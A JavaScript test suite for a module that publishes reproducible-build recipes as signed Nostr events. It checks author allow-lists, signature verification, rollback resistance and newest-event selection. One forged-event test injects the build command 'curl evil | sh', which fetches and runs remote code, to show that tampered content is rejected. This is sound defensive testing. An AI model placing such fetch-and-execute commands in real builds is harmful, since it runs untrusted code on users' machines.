// Recipes as signed events: whose are run, which of two wins, and that a relay
// cannot add or take away one by what it answers.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { generateSecretKey, getPublicKey, finalizeEvent, verifyEvent } from 'nostr-tools/pure';
import { recipeTemplate, recipeFromEvent, recipesFromEvents, fetchRecipeEvents, signedRecipes, recipesInUse, loadAuthors, RECIPE_KIND, RECIPE_TOPIC, AUTHORS_FILE } from '../recipe-events.mjs';
import { parseRecipe } from '../recipes.mjs';
import { openDb, saveRebuild } from '../db.mjs';
import { feedRows } from '../site-export.mjs';

const doc = (over = {}) => JSON.stringify({ schema: 1, id: 'mono', ecosystem: 'npm', repo: 'https://github.com/x/mono', packages: ['@mono/*'], fetch: ['yarn install --immutable'], build: ['make build'], ...over });
const key = generateSecretKey(), other = generateSecretKey();
const authors = [{ name: 'A', pubkey: getPublicKey(key) }];
const sign = (text, { by = key, at = 1_800_000_000_000, change = (t) => t } = {}) => finalizeEvent(change(recipeTemplate(text, at)), by);
const NOW = 1_800_001_000_000; // after every event signed here
const opts = (log = []) => ({ verify: verifyEvent, log: (m) => log.push(m), now: NOW });

test('a recipe is published as a code snippet the WalletScrutiny relay stores, its content the document as written', () => {
  const text = doc({ notes: 'as written,  with  its spaces' });
  const t = recipeTemplate(text, 1_800_000_000_000);
  assert.equal(t.kind, 1337);
  assert.equal(t.content, text);
  assert.equal(t.created_at, 1_800_000_000);
  for (const tag of [['t', RECIPE_TOPIC], ['c', 'walletscrutiny'], ['name', 'mono.recipe.json'], ['repo', 'https://github.com/x/mono']]) assert.ok(t.tags.some(x => x[0] === tag[0] && x[1] === tag[1]), tag.join('='));
  assert.throws(() => recipeTemplate(doc({ repo: 'http://x/y' })), /repo/, 'what is no recipe is not signed');
});

test('an event is a recipe only when a listed author signed it and it verifies', () => {
  const log = [];
  const r = recipeFromEvent(sign(doc()), authors, opts(log));
  assert.equal(r.key, parseRecipe(JSON.parse(doc())).key, 'filed under the same key as the same recipe in a file');
  assert.match(r.event, /^[0-9a-f]{64}$/);
  assert.equal(r.author, authors[0].pubkey);
  assert.equal(recipeFromEvent(sign(doc(), { by: other }), authors, opts(log)), null);
  assert.match(log.pop(), /author is not on the list/);
  const forged = { ...sign(doc()), content: doc({ build: ['curl evil | sh'] }) };
  assert.equal(recipeFromEvent(forged, authors, opts(log)), null, 'content changed after signing');
  assert.match(log.pop(), /signature does not verify/);
  const stolenName = { ...sign(doc(), { by: other }), pubkey: authors[0].pubkey };
  assert.equal(recipeFromEvent(stolenName, authors, opts(log)), null, 'a listed author\'s key written over another\'s signature');
  assert.equal(recipeFromEvent(sign(doc(), { change: (t) => ({ ...t, kind: 1 }) }), authors, opts()), null, 'another kind');
  assert.equal(recipeFromEvent(sign(doc(), { change: (t) => ({ ...t, tags: t.tags.filter(x => x[0] !== 't') }) }), authors, opts()), null, 'a code snippet that is not marked as a recipe');
  assert.equal(recipeFromEvent(sign(doc(), { change: (t) => ({ ...t, content: '{"schema":1,"id":"x"}' }) }), authors, opts(log)), null);
  assert.match(log.pop(), /recipe x: /);
  assert.equal(recipeFromEvent(sign(doc(), { change: (t) => ({ ...t, content: `${' '.repeat(20001)}` }) }), authors, opts(log)), null);
  assert.match(log.pop(), /too long/);
  assert.equal(recipeFromEvent(sign(doc(), { at: NOW + 3600 * 1000 }), authors, opts(log)), null, 'no newer event could ever replace it');
  assert.match(log.pop(), /dated in the future/);
  assert.ok(recipeFromEvent(sign(doc(), { at: NOW + 60 * 1000 }), authors, opts()), 'a clock a minute ahead is a clock');
  assert.equal(recipeFromEvent(null, authors, opts()), null);
  assert.equal(recipeFromEvent(sign(doc()), [], opts()), null, 'nobody listed, nothing run');
});

test('the newest valid event per recipe id wins, whatever order a relay sends them in', () => {
  const old = sign(doc({ build: ['make old'] }), { at: 1_800_000_000_000 });
  const fresh = sign(doc({ build: ['make new'] }), { at: 1_800_000_500_000 });
  const laterButBroken = sign(doc(), { at: 1_800_000_900_000, change: (t) => ({ ...t, content: doc({ schema: 2 }) }) });
  const second = sign(doc({ id: 'another', packages: ['another'] }));
  for (const events of [[old, fresh, laterButBroken, second], [second, laterButBroken, fresh, old]]) {
    const got = recipesFromEvents(events, authors, opts());
    assert.deepEqual(got.map(r => [r.id, r.build[0]]), [['another', 'make build'], ['mono', 'make new']]);
    assert.equal(got[1].event, fresh.id);
  }
  const twins = [sign(doc({ build: ['make a'] })), sign(doc({ build: ['make b'] }))];
  assert.equal(recipesFromEvents(twins, authors, opts())[0].event, recipesFromEvents([...twins].reverse(), authors, opts())[0].event, 'two of the same second: every reader picks the same');
});

test('relays are asked for the listed authors only; one that is down is passed over, all down is an error and not "no recipes"', async () => {
  const e = sign(doc());
  const asked = [];
  const ask = async (url, filter) => { asked.push([url, filter]); if (url === 'wss://down/') throw new Error('refused'); return [e]; };
  const log = [];
  assert.deepEqual(await fetchRecipeEvents({ authors, relays: ['wss://down/', 'wss://up/'], ask, log: (m) => log.push(m) }), [e]);
  assert.deepEqual(asked[1][1], { kinds: [RECIPE_KIND], authors: [authors[0].pubkey], '#t': [RECIPE_TOPIC] });
  assert.ok(log.some(m => /wss:\/\/down\/ could not be asked/.test(m)));
  await assert.rejects(fetchRecipeEvents({ authors, relays: ['wss://down/'], ask }), /no relay could be asked/);
  assert.deepEqual(await fetchRecipeEvents({ authors: [], relays: ['wss://up/'], ask: async () => { throw new Error('not asked'); } }), []);
});

test('an event once seen stays the recipe: a relay that is down, forgets it or serves an older one changes nothing', async () => {
  const db = openDb(':memory:');
  const old = sign(doc({ build: ['make old'] }), { at: 1_800_000_000_000 });
  const fresh = sign(doc({ build: ['make new'] }), { at: 1_800_000_500_000 });
  const theirs = sign(doc({ id: 'theirs' }), { by: other });
  let serves = [old, fresh, theirs];
  const use = (more = {}) => signedRecipes(db, { authors, relays: ['wss://r/'], ask: async () => { if (serves === 'down') throw new Error('refused'); return serves; }, verify: verifyEvent, now: NOW, ...more });
  assert.deepEqual((await use()).map(r => [r.id, r.build[0]]), [['mono', 'make new']], 'what a relay sends beyond the filter is still checked');
  for (const then of ['down', [], [old]]) {
    serves = then;
    assert.deepEqual((await use()).map(r => r.event), [fresh.id], JSON.stringify(then === 'down' ? then : then.length));
  }
  const newer = sign(doc({ build: ['make newest'] }), { at: 1_800_000_800_000 });
  serves = [newer];
  assert.deepEqual((await use()).map(r => r.event), [newer.id], 'a newer one replaces it');
  assert.deepEqual(await use({ authors: [] }), [], 'an author taken off the list');
  serves = [old, fresh];
  assert.deepEqual((await use()).map(r => r.event), [newer.id], 'back on the list, with a relay that serves older ones only: what was kept is still the floor');
});

test('two authors of one recipe id: the newest of those listed, and each keeps their own floor', async () => {
  const db = openDb(':memory:');
  const mine = sign(doc({ build: ['make mine'] }), { at: 1_800_000_000_000 });
  const theirs = sign(doc({ build: ['make theirs'] }), { by: other, at: 1_800_000_500_000 });
  const both = [...authors, { name: 'Other', pubkey: getPublicKey(other) }];
  let serves = [mine, theirs];
  const use = (list) => signedRecipes(db, { authors: list, relays: ['wss://r/'], ask: async () => serves, verify: verifyEvent, now: NOW });
  assert.deepEqual((await use(both)).map(r => r.event), [theirs.id]);
  serves = [];
  assert.deepEqual((await use(authors)).map(r => r.event), [mine.id], 'the other author off the list: mine, kept from before');
  assert.deepEqual((await use(both)).map(r => r.event), [theirs.id]);
});

test('a file of recipes/ wins over a signed recipe with its id, and files come first', () => {
  const file = parseRecipe(JSON.parse(doc({ build: ['make file'] })));
  const signed = recipesFromEvents([sign(doc({ build: ['make event'] })), sign(doc({ id: 'another' }))], authors, opts());
  assert.deepEqual(recipesInUse([file], signed).map(r => [r.id, r.build[0]]), [['mono', 'make file'], ['another', 'make build']]);
});

test('the list of authors: names with a hex key; a file that is missing or wrong trusts nobody', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'depreb-authors-'));
  const file = path.join(dir, 'authors.json');
  const log = [];
  assert.deepEqual(loadAuthors(file, { log: (m) => log.push(m) }), []);
  assert.deepEqual(log, [], 'no list is not worth a line');
  fs.writeFileSync(file, JSON.stringify([{ name: 'A', pubkey: 'a'.repeat(64) }, { name: 'npub', pubkey: 'npub1xyz' }, { pubkey: 'b'.repeat(64) }, null]));
  assert.deepEqual(loadAuthors(file, { log: (m) => log.push(m) }), [{ name: 'A', pubkey: 'a'.repeat(64) }]);
  assert.match(log.pop(), /3 entries .* left out/);
  fs.writeFileSync(file, '{"name":"A"}');
  assert.deepEqual(loadAuthors(file, { log: (m) => log.push(m) }), []);
  assert.ok(loadAuthors(AUTHORS_FILE, { log: (m) => assert.fail(m) }).every(a => /^[0-9a-f]{64}$/.test(a.pubkey)), 'the list this repository ships reads without complaint');
});

test('a result names the event its recipe came as, in the database and in the feed', () => {
  const db = openDb(':memory:');
  saveRebuild(db, { ecosystem: 'npm', name: 'a', version: '1.0.0', result: 'reproduced', note: 'ok', recipe: 'mono@aaa', recipeEvent: 'e'.repeat(64) });
  saveRebuild(db, { ecosystem: 'npm', name: 'b', version: '1.0.0', result: 'reproduced', note: 'ok', recipe: 'babel@bbb' });
  const rows = feedRows(db);
  assert.equal(rows[0].recipeEvent, 'e'.repeat(64));
  assert.ok(!('recipeEvent' in rows[1]), 'a recipe from recipes/ has no event');
});
